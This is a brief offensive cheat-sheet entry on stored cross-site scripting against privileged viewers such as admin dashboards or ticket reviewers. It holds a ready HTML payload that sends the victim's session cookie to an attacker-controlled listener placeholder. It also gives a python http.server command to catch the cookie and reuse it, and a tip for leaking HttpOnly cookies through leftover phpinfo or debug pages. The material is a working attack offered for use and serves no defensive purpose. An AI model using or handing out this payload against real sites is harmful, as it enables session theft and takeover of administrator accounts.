# XSS

Stored XSS targeting a privileged viewer (admin dashboard, support-ticket reviewer, etc.) to steal their session — works when the session cookie lacks `HttpOnly`:

```html
<body onload="new Image().src='http://<LHOST>?c='+document.cookie;">
```

```bash
python -m http.server <LPORT>    # catch the exfil hit, then reuse the captured cookie
```

If `HttpOnly` IS set (so `document.cookie` is empty), look for a leftover `phpinfo()`/debug page — it often echoes `$_COOKIE` and raw request headers in plain HTML, leaking the cookie value a different way.
